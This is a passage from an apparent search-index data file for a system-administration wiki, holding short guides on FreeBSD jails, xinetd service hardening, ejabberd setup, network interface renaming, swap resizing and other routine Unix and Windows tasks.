Installing everything Setting root password in jail Changing local password for root New Password: Retype New Password: chsh: user information updated use.perl: not found ifconfig em0 inet 192.168.1.49 netmask 0xffffffff alias jail /data/example.domaine.com example.domaine.com 192.168.1.49 /bin/sh /runme.sh ifconfig em0 inet 192.168.1.49 netmask 0xffffffff -alias The use.perl is still there for compatibility reasons. This is not an error. The only information needed for the installation is the root password of the jail, if jailctl is not run in batch mode.\nStarting a jail link # jailctl start example.domaine.com Starting jail example.domaine.com... stty: stdin isn't a terminal yellow-sub# ln: /dev/log: Operation not permitted The errors are normal and simply due to jail peculiarities.\nStopping a jail link # jailctl stop example.domaine.com Stopping jail example.domaine.com... Sending TERM signal to jail processes... Stopping cron. Shutting down daemon processes:. Shutting down local daemons:. Terminated . Backing up a jail (not running) link # jailctl backup example.domaine.com Doing cold backup of jail example.domaine.com... A nice tar.gz appears in the directory where the jails are located.\nRestoring a jail (necessarily not running)\n# jailctl restore example.domaine.com No valid jail specified! Usage: jailctl [] = start|stop|status|create|delete|upgrade|backup|restore = hostname|all = Backup destination / restore source But what’s happening?\nTo restore a jail, it must not exist.\nDeleting a jail\n# jailctl delete example.domaine.com Deleting jail example.domaine.com... Restoring a jail, second attempt\n# jailctl restore example.domaine.com Restoring jail example.domaine.com from backup Backing up a jail (running)\nThis is the “premium option”.\n# jailctl backup example.domaine.com Doing warm backup of jail example.domaine.com... tar: ././var/run/log: tar format cannot archive socket: Inappropriate file type or format tar: ././var/run/logpriv: tar format cannot archive socket: Inappropriate file type or format The errors are normal.\n"
            }
        );
    index.add(
            {
                id:  789 ,
                href: "\/Phpftpwho_:_Monitoring_de_connections_pour_Proftpd\/",
                title: "PhpFtpWho: Connection Monitoring for Proftpd",
                description: "Documentation for monitoring connections to the Proftpd FTP server.",
                content: "Here is documentation for monitoring connections to the Proftpd FTP server:\nPhpFtpWho PDF\n"
            }
        );
    index.add(
            {
                id:  790 ,
                href: "\/Ifrename_:_renomer_ses_cartes_r%C3%A9seaux_sans_utiliser_udev\/",
                title: "Ifrename: Renaming Network Cards Without Using Udev",
                description: "How to use Ifrename to rename network interfaces based on MAC addresses without using udev",
                content: "Introduction linkIf you have multiple ethernet devices on a system, it’s useful to make sure they are always given the device names that you expect. This can be helpful when you’re managing upgrades - or for situations where you accidentally setup a system with eth1 plugged into a switch rather than eth0.\nThere are several different ways of managing the naming of devices if you’re using a dynamic /dev system such as udev or hotplug - but the simplest system which works for most cases is provided by the ifrename package.\nInstallation linkTo install it:\napt-get install ifrename libiw28 Configuration linkOnce installed this package will let you rename devices based upon something that shouldn’t change - their MAC addresses. (Finding MAC addresses of an ethernet device is simple.)\nOnce installed you may create a new file /etc/iftab to define the mapping between your ethernet device’s MAC addresses and the interface names.\nThe contents of this file should look similar to this:\neth0 mac 00:17:31:56:BC:2D eth1 mac 00:16:3E:2F:0E:9C With this configuration file in place when you reboot next you’ll discover that regardless of your kernel upgrading, that the network card with MAC address “00:17:31:56:BC:2D” will be setup as eth0, and that the card with MAC address “00:16:3E:2F:0E:9C” will be known as eth1.\n(The actual renaming will happen automatically via the addition of /etc/init.d/ifrename.)\nUdev linkYou can edit this file too to change the card interfaces:\n/etc/udev/rules.d/z25_persistent-net.rules "
            }
        );
    index.add(
            {
                id:  791 ,
                href: "\/EJabberd_:_Mise_en_place_d%27un_serveur_Jabber_%28messagerie_instantan%C3%A9e%29\/",
                title: "EJabberd: Setting up a Jabber server (instant messaging)",
                description: "A guide for installing and configuring EJabberd, a Jabber/XMPP server written in Erlang for instant messaging.",
                content: "Introduction linkejabberd is a Jabber server written in Erlang, a relatively unknown language but optimized for distributed applications. ejabberd is supported by the French company Process One and is increasingly used. ejabberd handles high loads well and thanks to Erlang, it’s easy to create a cluster of ejabberd servers. Its installation and administration are made easy through its web interface.\nInstallation and configuration link First, you need to install ejabberd. (On Ubuntu or Debian, a simple apt-get install ejabberd is sufficient) Edit the configuration file /etc/ejabberd/ejabberd.cfg and add your domain name to the hosts line (around line 94) {hosts, [\"example.net\"]}. Still in the configuration file, add your username as administrator (around line 9):\n{acl, admin, {user, \"myaccount\"}}. Restart the server: /etc/init.d/ejabberd restart Create a user account with any Jabber client Connect to: http://localhost:5280/admin Note: the login is the complete JID, including “@domain”\nThat’s it, you now have access to the configuration interface "
            }
        );
    index.add(
            {
                id:  792 ,
                href: "\/fifo-and-cat-share-session-with-multiple-users\/",
                title: "Fifo and Cat: Share a Session with Multiple Users",
                description: "How to use named pipes (FIFOs) and cat to visually share a terminal session with other users",
                content: "Introduction linkThis technique can be used to show a remote colleague or client what you’re working on on the server.\nIt’s just for visual sharing and not interactive like with screen (see this documentation).\nCreating a fifo file link mkfifo /tmp/sortieScript ls -l /tmp/sortieScript prw-r--r-- 1 yannick yannick 0 Jul 6 02:59 /tmp/sortieScript mkfifo - Create named pipes (FIFOs) with the given NAMEs. A FIFO special file (a named pipe) is similar to a pipe, except that it is accessed as part of the file system. [...] the FIFO special file has no contents on the file system Reading the file by the remote user link cat /tmp/sortieScript Warning: as long as the file is not “catted”, it cannot be used by the following command…\nWhen a process tries to write to a FIFO that is not opened for read on the other side, the process is sent a SIGPIPE signal. Output script to this file link script -f /tmp/sortieScript Script started, file is /tmp/sortieScript From now on, everything that is typed is visible to the person “catting” the sortieScript file, including interactive sessions like vi…\nStop logging to the file with CTRL-D\n-f Flush output after each write. This is nice for telecooperation [...] Amazing: the demo link "
            }
        );
    index.add(
            {
                id:  793 ,
                href: "\/Quelques_infos_sur_la_b%C3%A9cane\/",
                title: "Some information about the machine",
                description: "Simple guide to get information about a Solaris machine, including CPU details and system configuration.",
                content: "To know the available CPUs on the machine:\npsrinfo -v To have all the information about the machine:\nsysdef "
            }
        );
    index.add(
            {
                id:  794 ,
                href: "\/Kill_et_lsof_:_Tuer_le_processus_%C3%A9coutant_sur_le_port_voulu\/",
                title: "Kill and lsof: Killing the process listening on a specific port",
                description: "How to kill a process listening on a specific port using lsof and kill commands in Linux",
                content: "You have certainly already looked for ways to kill a process that’s listening on a specific port. Here’s an example for port 1390:\nkill $( lsof -i:1390 -t ) "
            }
        );
    index.add(
            {
                id:  795 ,
                href: "\/Ivconv_:_Transcodage_de_texte_vers_n%27importe_quel_jeu_de_caract%C3%A8res\/",
                title: "Ivconv: Text Transcoding to Any Character Set",
                description: "How to use the iconv command on Debian to transcode text from one character set to another, useful for file conversion between UTF-8 and ISO standards.",
                content: "Debian provides the iconv command that allows you to transcode text to and from any character set. Example:\n$ iconv -f utf8 -t iso8859-15 fichier_utf8.txt This command will transcode from UTF-8 to ISO-8859-15. It’s very useful if you’ve developed a web page in UTF-8 and realized it too late.\n"
            }
        );
    index.add(
            {
                id:  796 ,
                href: "\/Obtenir_l\u0027heure_au_format_Unix_sous_Solaris\/",
                title: "Get Unix Format Time on Solaris",
                description: "A script to get the epoch time format on Solaris systems.",
                content: "Getting Unix Format Time on Solaris linkHere is a little script to obtain Unix format on Solaris (Epoch Time):\n#!/bin/sh /usr/bin/truss /usr/bin/date 2\u003e\u00261 | nawk -F= '/^time\\(\\)/ {gsub(/ /,\"\",$2);print $2}' exit $? And finally, let’s see it in action:\n# ./edate 1149276150 "
            }
        );
    index.add(
            {
                id:  797 ,
                href: "\/Windows_:_Arr%C3%A9ter_un_arret_du_syst%C3%A8me_en_cours\/",
                title: "Windows: Stop a system shutdown in progress",
                description: "How to stop a Windows system shutdown that is already in progress using a simple command",
                content: "Sometimes it’s necessary to create scripts that reboot your machine after modifications. Or you may have caught a virus that tells you your PC will reboot in x seconds.\nTo cancel this reboot, simply use:\nshutdown -a "
            }
        );
    index.add(
            {
                id:  798 ,
                href: "\/Xinetd_:_S%C3%A9curiser_ses_services\/",
                title: "Xinetd: Securing Services",
                description: "Learn how to configure Xinetd to secure network services through access control, DoS protection, and other security measures.",
                content: "Introduction linkxinetd - eXtended InterNET services daemon - provides good security against intrusion and reduces the risks of Denial of Services (DoS) attacks. Like the well-known couple (inetd+tcpd), it enables the configuration of access rights for a given machine, but it can do much more. In this article, we will discover its many features.\nThe classical inetd helps controlling network connections to a computer. When a request comes to a port managed by inetd, then inetd forwards it to a program called tcpd. Tcpd decides, according to the rules contained in the hosts.{allow, deny} files, whether or not to grant the request. If the request is allowed, then the corresponding server process (e.g., ftp) can be started. This mechanism is also referred to as tcp_wrapper.\nxinetd provides access control capabilities similar to those provided by tcp_wrapper. However, its capabilities extend much further:\nAccess control for TCP, UDP, and RPC services (the latter ones aren’t well supported yet) Access control based on time segments Full logging, either for connection success or failure Efficient containment against Denial of Services (DoS) attacks (attacks which attempt to freeze a machine by saturating its resources): Limitation on the number of servers of the same type to run at a time Limitation on the total number of servers Limitation on the size of the log files Binding of a service to a specific interface: this allows you, for instance, to make services available to your private network but not to the outside world Can be used as a proxy to other systems. Quite useful in combination with ip_masquerading (or Network Address Translation - NAT) in order to reach the internal network The main drawback, as already mentioned, concerns poorly supported RPC calls. However, portmap can coexist with xinetd to solve this.\nThe first part of this article explains how xinetd works. We’ll spend some time on service configuration, on some specific options (binding to an interface, redirection) and demonstrate this with a few examples. The second part shows xinetd at work, the logs it generates, and finishes with a useful tip.\nCompilation \u0026 Installation linkYou can get xinetd from www.xinetd.org. For this article, we will use version 2.1.8.9pre10. Compilation and installation are done in the classical way: the usual commands ./configure; make; make install do it all :) configure supports the usual options. Three specific options are available at compile time:\n–with-libwrap: with this option, xinetd checks the tcpd configuration files (/etc/hosts.{allow, deny}) and if access is accepted, it then uses its own control routines. For this option to work, tcp_wrapper and its libraries have to be installed on the machine (Author’s note: what can be done with the wrapper can also be done with xinetd. Allowing this compatibility leads to multiplying the config files and makes the administration heavier… in short, I don’t recommend it) –with-loadavg: this option allows xinetd to handle the max_load configuration option. This allows the deactivation of some services when the machine is overloaded. An option essential to prevent some DoS attacks (check the attribute max_load in table 1) –with-inet6: if you feel like using IPv6, this option allows support for it. Both IPv4 and IPv6 connections are managed, but IPv4 addresses are changed into IPv6 format Before starting xinetd, you don’t have to stop inetd. Nevertheless, not doing so may lead to an unpredictable behavior of both daemons!\nSome signals can be used to modify xinetd behavior:\nSIGHUP (previously SIGUSR2): hard re-configuration: the configuration file is re-read, the services parameters are changed accordingly, and the outdated daemons are killed SIGUSR1: write a dump to var/run/xinetd.dump of the internal state SIGQUIT: causes program termination SIGTERM: ends xinetd and the daemons it generated SIGIOT (aka SIGABRT, value 6): check the internal state of xinetd. Take care that on my RH 7.3, the signal SIGIOT is defined as a synonym for SIGABRT: kill -s SIGIOT 574 bash: kill: bad signal spec `SIGIOT' kill -s SIGABRT 574 tail -1 /var/log/messages May 3 12:18:25 batman xinetd[574]: Consistency check passed Configuration linkThe /etc/xinetd.conf file is the default configuration file for the xinetd daemon (a command line option allows providing another one). The xinetd configuration is not very complex, but it may be a long work and the syntax is unfortunately quite different from that of its predecessor inetd.\nTwo utilities (itox and xconv.pl) are provided with xinetd and allow to convert the /etc/inetd.conf file into a configuration file for xinetd. Obviously, that’s not enough since the rules specified in the wrapper configuration are ignored. The itox program, still maintained, is no longer developed. The xconv.pl program is a better solution, even if the result has to be modified because of features that xinetd has in addition to inetd:\n/usr/local/sbin/xconv.pl \u003c /etc/inetd.conf \u003e /etc/xinetd.conf The configuration file begins with a default section. The attributes in this section will be used by every service xinetd manages. After that, you will find as many sections as there are services, each of them being able to re-define specific options in relation to the default ones.\nThe default values section looks like:\ndefaults { attribut opérateur valeur(s) ... } Each attribute defined in this section keeps the provided value(s) for all services described thereafter. Thus, the only_from attribute allows giving a list of authorized addresses that should be able to connect to servers:\nonly_from = 192.168.1.0/24 192.168.5.0/24 192.168.10.17 Every service declared thereafter will allow access from machines having an address contained in the list. However, these default values can be modified for each service (check the operators, explained a bit further down). Nevertheless, this process is a bit risky. As a matter of fact, to keep things simple and secure, it’s much better not to define default values and change them later on within a service. For instance, talking about access rights, the simplest policy consists in denying access to everyone and next allowing access to each service to those who really need it (with tcp_wrapper, this is done from an hosts.deny file containing ALL:ALL@ALL, and an hosts.allow file only providing authorized services and addresses).\nEach section describing a service in the config file looks like:\nservice name_of_service { attribut operator value(s) ... } Three operators are available: ‘=’, ‘+=’ and ‘-=’. Most of the attributes only support the ‘=’ operator, used to assign a fix value to an attribute. The ‘+=’ operator adds an item to a list of values, while the ‘-=’ operator removes this item.\nThe table 1 briefly describes some of these attributes. We’ll see how to use them with a few examples. Reading the xinetd.conf man page provides more information.\nAttribute Values and description flags Only the most current values are mentioned here, check the documentation to find new ones:\n- IDONLY: only accepts connections from clients having an identification server\n- NORETRY: avoids a new process to be forked again in case of failure\n- NAMEINARGS: the first argument of the server*args attribute is used as argv[0] for the server. This allows using tcpd by putting it in the server attribute, next writing the server name and its arguments such as server_args, as you would do with inetd\n- SENSOR: when a server is flagged as a sensor, it is considered as a honeypot. When a client attempts to connect to it, it is added to the no_access list, forbidding any further access to any other servers started by xinetd log_type xinetd uses syslogd and the daemon.info selector by default.\n- SYSLOG selector [level]: allows choosing among daemon, auth, user or local0-7 from syslogd\n- FILE [max_size [absolute_max_size]]: the specified file receives information. The two options set the file size limit. When the size is reached, the first one sends a message to syslogd, the second one stops the logging for this service (if it’s a common file - or fixed by default - then various services can be concerned) log_on_success Different information can be logged when a server starts:\n- PID: the server’s PID (if it’s an internal xinetd service, the PID has then a value of 0)\n- HOST: the client address\n- USERID: the identity of the remote user, according to RFC1413 defining identification protocol\n- EXIT: the process exit status\n- DURATION: the session duration log_on_failure Here again, xinetd can log a lot of information when a server can’t start, either by lack of resources or because of access rules:\n- HOST, USERID: like above mentioned\n- ATTEMPT: logs an access attempt. This is an automatic option as soon as another value is provided\n- RECORD: logs every information available on the client. Warning: this is deprecated in recent versions nice Changes the server priority like the _nice* command does no*access List of clients not having access to this service only_from List of authorized clients. If this attribute has no value, the access to the service is denied port The port associated with the service. If it’s also defined in the /etc/services file, the 2 port numbers must match protocol The specified protocol must exist in the /etc/protocols file. If no protocol is given, the service’s default one is used instead server The path to the server server_args Arguments to be given to the server socket_type stream (TCP), dgram (UDP), raw (IP direct access) or seqpacket () type xinetd can manage 3 types of services:\n- RPC: for those defined in the /etc/rpc file… but doesn’t work very well\n- INTERNAL: for services directly managed by xinetd (_echo*, time, daytime, chargen and discard)\n- UNLISTED: for services not defined either in the /etc/rpc file, or in the /etc/services file\nLet’s note it’s possible to combine various values, as we’ll see with servers, services and xadmin internal services wait Defines the service behavior towards threads. Two values are acceptable:\n- yes: the service is mono-thread, only one connection of this type can be managed by the service\n- no: a new server is started by xinetd for each new service request according to the defined maximum limit (Warning, by default this limit is infinite) cps Limits the number of incoming connections. The first argument is this number itself. When the threshold is exceeded, the service is deactivated for a given time, expressed in seconds, provided with the second argument instances Defines the maximum number of servers of the same type able to work at the same time max_load This gives really the maximum load for a server (for example, 2 or 2.5). Beyond this limit, requests on this server are rejected per_source Either an integer, or UNLIMITED, to restrict the number of connections from the same origin to a server The four last attributes shown in table1 allow controlling the resources depending on a server. This is efficient to protect from Denial of Service (DoS) attacks (freezing a machine by using all of its resources).\nThis section presented a few xinetd features. The next sections show how to use it and give some rules to make it work properly.\nAccess Control linkAs we have seen previously, you can grant (or forbid) access to your box by using IP addresses. However, xinetd allows more features:\nYou can do access control by hostname resolution. When doing this, xinetd does a lookup on the hostname(s) specified for every connection, and compares the connecting address to the addresses returned for the hostname(s) You can do access control by .domain.com. When a client connects, xinetd will reverse lookup the connecting address, and see if it is in the specified domain To optimize things, obviously IP addresses are better, that way you avoid name lookup(s) on incoming connections to that service. If you must do access control by the hostname, you can significantly speed things up if you run a local (at least a caching) name server. It’s even better if you are using domain sockets to perform your address lookup (don’t put a nameserver entry in /etc/resolv.conf).\nService defaults linkThe defaults section allows setting values for a number of attributes (check the documentation for the whole list). Some of these attributes (only_from, no_access, log_on_success, log_on_failure, …) hold simultaneously the values allocated in this section and the ones provided in the services.\nBy default, denying access to a machine is the first step of a reliable security policy. Next, allowing access will be configured on a per-service basis. We’ve seen two attributes allowing to control access to a machine, based on IP addresses: only_from and no_access. Selecting the second one we write:\nno_access = 0.0.0.0/0 which fully blocks services access. However, if you wish to allow everyone to access echo (ping) for instance, you then should write in the echo service:\nonly_from = 0.0.0.0/0 Here is the logging message you get with this configuration:\nSep 17 15:11:12 deimos xinetd[26686]: Service=echo-stream: only_from list and no_access list match equally the address 192.168.1.1 Specifically, the access control is done comparing the lists of addresses contained in both attributes. When the client address matches both lists, the least general one is preferred. In case of equality, like in our example, xinetd is unable to choose and refuses the connection. To get rid of this ambiguity, you should have written:\nonly_from = 192.0.0.0/8 An easier solution is to only control the access with the attribute: only_from = Not giving a value makes every connection fail :) Then, every service allows access by means of this same attribute.\nImportant, not to say essential: in case of no access rule at all (i.e. neither only_from nor no_access) for a given service (allocated either directly or with the default section), the access to the service is allowed!\nHere is an example of defaults:\ndefaults { instances = 15 log_type\u0026 = FILE /var/log/servicelog log_on_success = HOST PID USERID DURATION EXIT log_on_failure = HOST USERID RECORD only_from = per_source = 5 disabled = shell login exec comsat disabled = telnet ftp disabled = name uucp tftp disabled = finger systat netstat #INTERNAL disabled = time daytime chargen servers services xadmin #RPC disabled = rstatd rquotad rusersd sprayd walld } Among internal services, servers, services, and xadmin allow managing xinetd. More on this later.\nConfiguring a service linkTo configure a service, we need… nothing :) In fact, everything works like it does with defaults values: you just have to specify the attributes and their value(s) to manage the service. This implies either a change in the defaults values or another attribute for this service.\nSome attributes must be present according to the type of service (INTERNAL, UNLISTED or RPC):\nAttribute Comment socket-type Every service user Only for non-INTERNAL services server Only for non-INTERNAL services wait Every service protocol Every RPC service and the ones not contained in /etc/services rpc_version Every RPC service rpc_number Every RPC service, not contained in /etc/rpc port Every non-RPC service, not contained in /etc/services This example shows how to define services:\nservice ntalk { socket_type = dgram wait = yes user = nobody server = /usr/sbin/in.ntalkd only_from = 192.168.1.0/24 } service ftp { socket_type = stream wait = no user = root server = /usr/sbin/in.ftpd server_args = -l instances = 4 access_times = 7:00-12:30 13:30-21:00 nice = 10 only_from = 192.168.1.0/24 } Let’s note that these services are only allowed on the local network (192.168.1.0/24). Concerning FTP, some more restrictions are expected: only four instances are allowed and the service will be available only during certain segments of time.\nPort binding: the bind attribute linkThis attribute allows the binding of a service to a specific IP address. This is only useful when a machine has at least two network interfaces, for example, a computer being part of a local network and connected to the Internet through a separate interface.\nFor instance, a company wishes to install an FTP server for its employees (to access and read internal documentation). This company wants to provide its clients with an FTP access towards its products: bind has been made for this company :) The solution is to define two separate FTP services, one for public access, and a second one for internal company access only. However, xinetd must be able to differentiate them: the solution is to use the id attribute. It defines a service in a unique way (when not defined within a service, its value defaults to the name of the service).\nservice ftp { id = ftp-public wait = no user = root server = /usr/sbin/in.ftpd server_args = -l instances = 4 nice = 10 only_from = 0.0.0.0/0 #authorization for all clients bind = 212.198.253.142 #public IP address of this server } service ftp { id = ftp-interne socket_type = stream wait = no user = root server = /usr/sbin/in.ftpd server_args = -l only_from = 192.168.1.0/24 #internal use only bind = 192.168.1.1 #local IP address of this server (charly) } The use of bind will allow calling the corresponding daemon, according to the destination of the packets. Thus, with this configuration, a client on the local network must give the local address (or the associated name) to access internal data. In the log file, you can read:\n00/9/17@16:47:46: START: ftp-public pid=26861 from=212.198.253.142 00/9/17@16:47:46: EXIT: ftp-public status=0 pid=26861 duration=30(sec) 00/9/17@16:48:19: START: ftp-interne pid=26864 from=192.168.1.1 00/9/17@16:48:19: EXIT: ftp-interne status=0 pid=26864 duration=15(sec) The first part comes from the command ftp 212.198.253.142, while the second part is about the command from charly to itself:\nftp 192.168.1.1 Obviously, there’s a problem: what happens if a machine doesn’t have two static IP addresses? This can happen with ppp connections or when using the dhcp protocol. It seems it would be much better to bind services to interfaces than to addresses. However, this is not yet supported in xinetd and is a real problem (for instance, writing a C module to access an interface or address depends on the OS, and since xinetd is supported on many OSes…). Using a script solves the problem:\n#!/bin/sh PUBLIC_ADDRESS=`/sbin/ifconfig $1 | grep \"inet addr\" | awk '{print $2}'| awk -F: '{print $2}'` sed s/PUBLIC_ADDRESS/\"$PUBLIC_ADDRESS\"/g /etc/xinetd.base \u003e /etc/xinetd.conf This script takes the /etc/xinetd.base file, containing the desired configuration with PUBLIC_ADDRESS as a replacement for the dynamic address, and changes it in /etc/xinetd.conf, modifying the PUBLIC_ADDRESS string with the address associated to the interface passed as an argument to the script. Next, the call to this script depends on the type of connection: the simplest is to add the call into the right ifup-* file and to restart xinetd.\nService redirection towards an other machine: the redirect attribute linkxinetd can be used as a transparent proxy, sort of (well, almost… as we’ll see it later) with the redirect attribute. It allows sending a service request towards another machine to the desired port.\nservice telnet { socket_type = stream wait = no user = root server = /usr/sbin/in.telnetd only_from = 192.168.1.0/24 redirect = 192.168.1.15 23 } Let’s watch what’s going on now:\n$ telnet deimos Trying 192.168.1.1... Connected to charly. Escape character is '^]'. Digital UNIX (deimos) (ttyp1) login: At first, the connection seems to be established on charly, but the following shows that sabrina (an alpha machine, hence “Digital UNIX”) took over. This mechanism can be both useful and dangerous. When setting it up, logging must be done on both ends of the connection. Furthermore, for this type of service, the use of DMZ and firewall is strongly recommended ;-)\nSpecial services linkThree services only belong to xinetd. Since these services can’t be found in /etc/rpc or /etc/services, they must have the UNLISTED flag (besides the INTERNAL flag informing they are xinetd services):\nservers: informs about servers in use services: informs about available services, their protocol and their port xadmin: mixes the functions of the two previous ones Obviously, these services make your computer more vulnerable since they provide important information. Presently, their access is not protected (password protected, for instance). You should use them only at configuration time. Next, in the defaults section, you must deny their use:\ndefaults { ... disabled = servers services xadmin ... } Before activating them, you should take some precautions:\nThe machine running xinetd must be the only one able to connect to these services Limit the number of instances to one Allow access only from the machine running the server Let’s take the example of the xadmin service (the two others can be configured in the same way, apart from the port number ;-)):\nservice xadmin { type = INTERNAL UNLISTED port = 9100 protocol = tcp socket_type = stream wait = no instances = 1 only_from = 192.168.1.1 #charly } The xadmin service has 5 commands:\nhelp … show run: like the servers service, informs about the presently running servers show avail: like the services service, informs about the available services (and a bit more) bye or exit… Now, you know they exist: forget them ;-) You can test without these services. Commands such as netstat, fuser, lsof, … allow you to know what’s going on on your machine, without making it vulnerable as you would when using these services!\nLet’s play a bit… linkStarting with a riddle linkHere is a small exercise for the ones who survived ;-) First I will explain the configuration used in this exercise and then we will try to find out what happens and why it does not work.\nWe only need the finger service:\nservice finger { flags = NAMEINARGS server = /usr/sbin/tcpd server_args = in.fingerd socket_type = stream wait = no user = nobody only_from = 192.168.1.1 #charly } xinetd wasn’t compiled with the –with-libwrap option (check the attribute server). The defaults section is of the same kind as the one previously provided: every access to charly is denied wherever the connection comes from. The finger service is not deactivated, nevertheless:\npappy@charly$ finger pappy@charly [charly] pappy@charly$ pappy@bosley$ finger pappy@charly [charly] pappy@bosley$ It seems the request didn’t work properly, neither from charly (192.168.1.1), an authorized machine, nor from bosley (192.168.1.10). Let’s have a look at the log files:\n/var/log/servicelog: 00/9/18@17:15:42: START: finger pid=28857 from=192.168.1.1 00/9/18@17:15:47: EXIT: finger status=0 pid=28857 duration=5(sec) 00/9/18@17:15:55: FAIL: finger address from=192.168.1.10 The request from charly (the two first lines) works properly according to xinetd: the access is allowed and the request takes 5 seconds. On the other hand, the request from bosley is rejected (FAIL). If we look at the configuration of the finger service, the server used is not really in.fingerd, but the tcp_wrapper tcpd service. The wrapper log says:\n/var/log/services: Sep 18 17:15:42 charly in.fingerd[28857]: refused connect from 192.168.1.1 We see that there’s only one line matching our two queries! The one from bosley (the second one) was intercepted by xinetd, so it’s quite normal not to find it in that log. The selected line really corresponds to the request xinetd allowed, sent from charly to charly (the first one): time and PID are identical.\nLet’s summarize what we have:\nxinetd allowed the request the finger request goes through tcpd in.fingerd rejected this request What’s going on, then? Since the request is accepted by xinetd, it’s sent to the specified server (here tcpd). Nevertheless, tcpd rejects this connection. Then, we must have a look at hosts.{allow,deny}. The /etc/hosts.deny file only contains ALL:ALL@ALL, which explains why the request has been rejected by the wrapper!\nAccording to the way the server and server_args service lines have been defined, the wrapper features are still accessible (banner - there’s a banner attribute in xinetd-, spawn, twist, …). Remember that the –with-libwrap compilation option only adds access rights control (with the help of hosts.{allow,deny} files), before xinetd process starts. In this example, we saw that this configuration allows us to continue using the tcp wrapper features.\nThis overlapping of features, if it can work, may as well lead to strange behaviors. To use xinetd together with inetd and portmap, it’s much better to manage a service with only one of these “super-daemons”.\nchroot a service linkIt’s often suggested to restrict the fields of some services, or to create a new environment. The chroot command allows changing the root directory for a command (or a script):\nchroot [options] new_root This is often used to protect services such as bind/DNS or ftp. To duplicate this behavior while benefiting from xinetd features, you have to declare chroot as a server. Then, you just have to pass other arguments via the server_args attribute :)\nservice ftp { id = ftp socket_type = stream wait = no user = root server = /usr/sbin/chroot server_args = /var/servers/ftp /usr/sbin/in.ftpd -l } Thus, when a request is sent to this service, the first instruction used is chroot. Next, the first argument passed to it is the first one on the server_args line, that is the new root. Last, the server is started.\npop3 server linkpop3 seems to be very popular: I received emails asking me how to handle it through xinetd. Here is a sample configuration:\nservice pop3 { disable = no socket_type = stream wait = no user = root server = /usr/sbin/ipop3d # log_on_success += USERID # log_on_failure += USERID } Of course, you have to put your own path for the server attribute.\nThe use of pop3 through xinetd could be painful, depending on the values you use for logging. For instance, the use of USERID sends a request from your xinetd to an identd server hosted at the pop’s client. If no such server is available, a timeout is waited for 30 seconds.\nSo, when somebody tries to get his mail, he has to wait at least for those 30 seconds if no identd server responds. You have to choose between:\nInstall an identd server on all the clients so your logs are very sharp (take care, one can change the information provided by identd) Decrease the quality of your logging for that service so that your users could get their mails quickly Conclusion linkYou could now ask yourself which daemon to choose from xinetd or inetd. xinetd offers more features, but it requires a bit more administration, especially until it is included by default in the distributions (it is now true for most of them). The most secure solution is to use xinetd on machines with public access (like Internet) since it offers better defense. For machines within a local network, inetd should be enough.\nProblems linkIf you have errors like this in your logs:\nxinetd[4361]: FAIL: nrpe service_limit from=192.168.0.19 xinetd[4361]: FAIL: nrpe service_limit from=192.168.0.16 xinetd[4361]: FAIL: nrpe service_limit from=192.168.0.16 xinetd[4361]: FAIL: nrpe service_limit from=192.168.0.19 xinetd[4361]: FAIL: nrpe service_limit from=192.168.0.19 xinetd[4361]: FAIL: nrpe service_limit from=192.168.0.16 xinetd[4361]: FAIL: nrpe service_limit from=192.168.0.16 Check by default the number of max instances:\n$ grep instances \u003c /etc/xinetd.conf instances = 60 Then you have to add to your service (here nrpe is: /etc/xinet.d/nrpe) this line:\ninstances = 120 The number is the number of instances. Grow it up if you encounter this problem. Ex:\n# default: off # description: NRPE (Nagios Remote Plugin Executor) service nrpe { disable = no flags = REUSE type = UNLISTED port = 5666 socket_type = stream wait = no user = nagios group = nagios server = /usr/sbin/nrpe server_args = -c /etc/nagios/nrpe.cfg --inetd log_on_failure += USERID instances = 120 # disable = yes # only_from = 127.0.0.1 } "
            }
        );
    index.add(
            {
                id:  799 ,
                href: "\/Resizer_sa_swap\/",
                title: "Resize Swap",
                description: "How to resize swap space in Linux by extending LVM volumes, creating new swap volumes, or using swap files",
                content: "Introduction linkSometimes it is necessary to add more swap space after installation. For example, you may upgrade the amount of RAM in your system from 128 MB to 256 MB, but there is only 256 MB of swap space. It might be advantageous to increase the amount of swap space to 512 MB if you perform memory-intense operations or run applications that require a large amount of memory.\nYou have three options: create a new swap partition, create a new swap file, or extend swap on an existing LVM2 logical volume. It is recommended that you extend an existing logical volume.\nExtending Swap on an LVM2 Logical Volume linkTo extend an LVM2 swap logical volume (assuming /dev/VolGroup00/LogVol01 is the volume you want to extend):\nDisable swapping for the associated logical volume:\n# swapoff -v /dev/VolGroup00/LogVol01 Resize the LVM2 logical volume by 256 MB:\n# lvm lvresize /dev/VolGroup00/LogVol01 -L +256M Format the new swap space:\n# mkswap /dev/VolGroup00/LogVol01 Enable the extended logical volume:\n# swapon -va Test that the logical volume has been extended properly:\n# cat /proc/swaps # free -m Creating an LVM2 Logical Volume for Swap linkTo add a swap volume group (assuming /dev/VolGroup00/LogVol02 is the swap volume you want to add):\nCreate the LVM2 logical volume of size 256 MB:\n# lvm lvcreate VolGroup00 -n LogVol02 -L 256M Format the new swap space:\n# mkswap /dev/VolGroup00/LogVol02 Add the following entry to the /etc/fstab file:\n/dev/VolGroup00/LogVol02 swap swap defaults 0 0 Enable the extended logical volume:\n# swapon -va Test that the logical volume has been extended properly:\n# cat /proc/swaps # free Creating a Swap File linkTo add a swap file:\nDetermine the size of the new swap file in megabytes and multiply by 1024 to determine the number of blocks. For example, the block size of a 64 MB swap file is 65536.\nAt a shell prompt as root, type the following command with count being equal to the desired block size:\n# dd if=/dev/zero of=/swapfile bs=1024 count=65536 Setup the swap file with the command:\n# mkswap /swapfile To enable the swap file immediately but not automatically at boot time:\n# swapon /swapfile To enable it at boot time, edit /etc/fstab to include the following entry:\n# /swapfile swap swap defaults 0 0 The next time the system boots, it enables the new swap file.\nAfter adding the new swap file and enabling it, verify it is enabled by viewing the output of the command cat /proc/swaps or free.\n"
            }
        );
    index.add(
            {
                id:  800 ,
                href: "\/SVK_:_Cr%C3%A9er_un_mirroir_en_lecture_pour_SVN\/",
                title: "SVK: Creating a Read-Only Mirror for SVN",
                description: "A short guide on how to create a read-only mirror of an SVN repository using SVK",
                content: "SVK: Creating a Read-Only Mirror for SVN linkHere is a short but useful guide for creating a read-only mirror of an SVN repository:\nSVN SVK PDF\n"
            }
        );
    index.add(
            {
                id:  801 ,
                href: "\/Gentoo_:_Utilisation_des_portages\/",
                title: "Gentoo: Using Portage",
                description: "A guide to effectively use Gentoo's Portage system for package management, including installation, updates, and best practices.",
